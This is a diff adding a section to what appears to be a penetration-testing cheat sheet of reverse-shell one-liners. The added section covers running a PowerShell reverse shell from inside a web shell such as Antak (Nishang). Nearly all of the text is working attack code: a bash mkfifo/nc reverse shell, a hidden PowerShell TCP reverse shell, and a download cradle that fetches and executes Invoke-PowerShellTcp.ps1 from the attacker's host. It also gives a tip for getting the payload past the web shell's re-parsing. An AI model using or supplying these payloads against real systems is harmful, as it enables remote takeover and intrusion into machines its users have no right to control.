@@ -48,3 +48,19 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {{LHOST}} {{LPO
 ```powershell
 powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
 ```
+
+### PowerShell from inside a web shell (Antak, etc.)
+
+> **Gotcha:** Antak (Nishang) and similar web shells run your input **inside an already-live PowerShell runspace** — there is no fresh `powershell.exe` process. Wrapping the payload in `powershell -nop -w hidden -c "..."` gets re-parsed by that runspace: the double-quoted string is expanded first, so `$c`, `$s`, etc. blank out (`$c=New-Object...` becomes `=New-Object...`) and the quotes/parens get stripped. Drop the wrapper.
+
+Paste the raw one-liner directly (no `powershell -c "..."`, no outer quotes):
+
+```powershell
+$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
+```
+
+Cleaner for web shells — download cradle with Nishang's `Invoke-PowerShellTcp.ps1` (host it on your attack box, then run in the web shell):
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}
+```
